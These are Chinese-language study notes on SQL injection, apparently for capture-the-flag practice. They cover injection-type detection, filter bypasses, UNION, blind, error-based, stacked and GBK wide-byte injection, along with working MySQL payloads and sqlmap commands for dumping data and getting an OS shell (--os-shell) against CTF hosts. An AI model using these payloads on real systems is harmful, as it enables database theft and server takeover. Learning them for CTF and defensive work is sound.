# SQL 注入基础

### \*\*\*\*

#### **1. 判断注入类型**

* **起手式：** 在参数后添加单引号 `'`，观察页面是否报错。
* **数字型：** 使用 `'2-1'` 与 `1` 对比。若两者的查询结果相同，则为数字型注入。例如，`id=1` 与 `id=2-1` 返回相同结果。
* **字符型：** 若 `'2-1'` 与 `1` 的结果不同，则为字符型注入。这是因为 PHP 等语言会将 `'2-1'` 识别为字符串 `'2-1'`，其值被强制类型转换为 `2`。

#### **2. 绕过技巧**

* **大小写绕过：**
 * UnIoN
 * SeLeCt
* **绕过正则过滤：**
 * 使用内联注释：`SEL/**/ECT`
 * 括号：`~~SEL(ECT)~~`
 * 字符串拼接：`~~CONCAT('sel','ect')~~`
* **联合查询 (**`**UNION**`**)：**
 * **作用：** 将多个 `SELECT` 语句的结果合并。
 * **前提：**`UNION` 前后的查询字段数必须一致。
 * **快速判断字段数：** 使用 `ORDER BY`，如 `ORDER BY 1, 2, 3...`，直到页面报错，报错前一个数字即为 ~~数据库的字段数~~ SQL查询的字段数。
 * **使用方式：**
 1. 先用 `id=-1`（或一个不存在的 id）来避免显示原始数据。
 2. 使用 `UNION SELECT 1, 2, ..., database()` 来探测数据库名，`database()` 是一个函数，可以用来显示当前的数据库名。
 3. 一旦发现注入点，可以使用 `UNION SELECT 1, 2, flag FROM ...` 等方式直接查询关键数据（争取时间）。

#### **3. 注释语法**

* `**#**`\*\* (MySQL)：\*\* 数据库中常用，但在 URL 中需编码为 `%23`，因 `#` 在 URL 中代表锚点。
* `**--**`\*\* (SQL 标准)：\*\* 后面必须跟一个空格。
* `**--+**`\*\* (URL 中常用)：\*\* 在 URL 中，`+` 被当作空格处理。
* `**--%20**`\*\* (URL 中常用)：\*\*`%20` 是空格的 URL 编码。

**注意：** 在 URL 中注入时，`--+` 和 `--%20` 更常见，而在裸 SQL 环境下，`-- ` （后直接接空格）更常用。

***

#### **4. 盲注**

* **布尔盲注：** 利用 `WHERE` 条件的真假（`TRUE` / `FALSE`）来判断，观察页面返回结果（如正常返回或无返回）。
 * **判断数据库名：**`AND LENGTH(database()) > 6`
 * **逐字符猜测：**
 * `AND ASCII(SUBSTR(database(), 1, 1)) > 77`
 * `MID()` 函数：`MID(string, start, length)`，`MID((SELECT database()), 1, 1)='c'`
 * `SUBSTRING()` 函数：`SUBSTRING(string, start, length)`，`SUBSTRING(database(), 1, 1)`
* **时间盲注：** 当页面不返回任何信息时，利用 `SLEEP()` 函数让页面延时。
 * `SELECT IF(ASCII(SUBSTRING((SELECT database()), 1, 1)) = 116, SLEEP(5), 0)`

***

#### **5. 报错注入**

* **原理：** 利用数据库的报错信息来获取数据。
* `**UPDATEXML()**`\*\* 函数：\*\*`updatexml(XML_document, XPath_string, new_value)`
* **原理：** 当 `XPath_string` 参数不符合 XPath 语法时，MySQL 会将该字符串作为错误信息的一部分返回。
* **构造 Payload：**`select updatexml(1, concat(0x7e, (select database()), 0x7e), 1)`
 * `0x7e` 是波浪号 `~` 的十六进制表示，用于分隔，确保 `concat` 后的字符串不符合 XPath 语法。
* **注入示例：**`id = '1' OR updatexml(1, concat(0x7e, (select database())), 1)`
* 除了 `**UPDATEXML()**`，MySQL 里还有：
 * `extractvalue()`
 * `floor(rand(0)*2)`（唯一索引冲突）

> `updatexml` 的第二个参数 `XPath_string` 必须是一个符合 XPath 语法规范的字符串。像 `~my_database_name~` 这样的字符串**不符合** XPath 语法，所以 `updatexml` 函数会因为无法解析这个字符串而抛出错误。数据库正是利用了这个机制，将不规范的字符串（即我们的查询结果）作为错误信息的一部分返回给用户。

***

#### **6. 堆叠注入**

* SQL语句:`SELECT * FROM TABLE WHERE id = '$id';`
* **原理：** 在同一条 SQL 语句中执行多个查询。
* **特点：** 在无法使用 `SELECT` 等关键字的情况下，可以利用 `show databases`、`show tables` 等命令。
* **payload：**
 * `1'; show databases#`
 * `1'; show tables#`
 * `1'; show columns from `1919810931114514`#` 注意是\`\`\`\` 反引号，特殊表名（`order`，带`-`的表名等）必须加反引号，如果不加任何反引号，会理解为一个数字常量，如果写普通单引号，会理解为一个字符串常量
 * 若 `SELECT` 被过滤，可使用预处理语句绕过，例如：`1'; prepare st from concat('se', 'lect', '* from `1919810931114514`'); execute st;--+`
* **注意：**
 * 表名和列名若包含特殊字符（如 `-`），需用反引号 \`\`\` 包裹。
 * PHP 的 `mysqli_query("...")` 默认只执行一条语句。
 * 如果要允许多条语句，必须用 `mysqli_multi_query()`，并且数据库连接字符串里开启 `multiStatements=true`

***

#### **7**\*\*. 宽字节注入\*\*

* **概念：** 宽字节是指使用两个或多个字节来表示一个字符的编码方式，例如 **GBK**、GB2312、BIG5 等。
* **原理：** 在 MySQL 中，当使用了像 `GBK` 这样的宽字节编码时，`addslashes()` 或 `mysql_real_escape_string()` 等函数会对单引号 `'` 等特殊字符进行转义，即在其前面加上一个反斜杠 `\`。
* **绕过：** 攻击者可以利用这个特性。例如，在 URL 中输入 `%df%27`。当它被转义时，会变成 `%df%5c%27`。在 GBK 编码中，`%df%5c` (`%5c` 是反斜杠 `\` 的十六进制) 会被数据库当作一个合法的汉字字符，这样后面的 `%27` (单引号 `'`) 就逃脱了转义，从而实现注入。

#### **8. 其他知识点**

* `**information_schema**`\*\* 数据库：\*\*
 * MySQL 5.0 版本后自带，存储所有数据库名、表名和列名。
 * **查询数据库名：**`information_schema.schemata`
 * **查询表名：**`information_schema.tables`
 * **查询列名：**`information_schema.columns`
* **SQLMap 命令（命令行注入）：**
 * **GET 请求：**`sqlmap.py -u "URL" --dbs` (获取数据库)
 * **POST 请求：**`sqlmap.py -u "URL" --data="id=1"`
 * `--current-db` (当前数据库)
 * `--tables -D "test_db"` (获取表)
 * `--columns -T "test_tb" -D "test_db"` (获取列)
 * `--dump -C "flag" -T "test_tb" -D "test_db"` (获取数据)
 * `--os-shell` (获取操作系统shell， 需要数据库用户有 **写文件 / xp\_cmdshell 权限** 或者特定的 DBMS 支持 )

#### **8. 手工注入**

```sql
SELECT group_concat(schema_name) FROM information_schema.schemata; -- 查所有数据库名，注意FROM不能再字段中间
SELECT database(); -- 只看当前数据库
SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='aa' -- 
SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='bb';
SELECT group_concat(cc) FROM 数据库名.表名;
```

#### **8. sqlmap命令**

```sql
#GET
python .\sqlmap.py -u http://node4.anna.nssctf.cn:28184/?wllm=1 --dbs
python .\sqlmap.py -u http://node4.anna.nssctf.cn:28184/?wllm=1 --current-db
python .\sqlmap.py -u http://node4.anna.nssctf.cn:28184/?wllm=1 --tables -D "test_db"
python .\sqlmap.py -u http://node4.anna.nssctf.cn:28184/?wllm=1 --columns -T "test_tb" -D "test_db"
python .\sqlmap.py -u http://node4.anna.nssctf.cn:28184/?wllm=1 --dump -C "flag" -T "test_tb" -D "test_db"
python sqlmap.py -u http://challenge.qsnctf.com:36821/?id=1  --os-shell
#POST
python sqlmap.py -u http://challenge.qsnctf.com:36821/?id=1 --data="id=1"
```
